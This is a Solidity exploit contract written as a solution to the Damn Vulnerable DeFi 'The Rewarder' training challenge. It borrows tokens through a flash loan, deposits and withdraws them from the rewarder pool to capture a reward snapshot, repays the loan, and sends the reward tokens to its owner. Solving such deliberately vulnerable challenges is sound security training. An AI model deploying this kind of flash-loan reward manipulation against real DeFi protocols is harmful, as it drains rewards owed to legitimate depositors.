// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackTheRewarder {
    using Address for address payable;

    FlashLoanerPool private pool;
    TheRewarderPool private rewarderPool;
    DamnValuableToken private liquidityToken;
    RewardToken public rewardToken;

    address public owner;

    constructor(
        FlashLoanerPool poolAddress,
        TheRewarderPool rewarderPoolAddress,
        DamnValuableToken liquidityTokenAddress
    ) {
        pool = poolAddress;
        rewarderPool = rewarderPoolAddress;
        liquidityToken = liquidityTokenAddress;
        owner = msg.sender;
    }

    // Function called by the pool during flash loan
    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(pool), "Sender must be lending pool");

        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(pool), amount);

        rewardToken = rewarderPool.rewardToken();
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function attack(uint256 amount) public payable {
        require(msg.sender == owner, "Sender must be owner");

        pool.flashLoan(amount);
    }

    receive() external payable {}
}
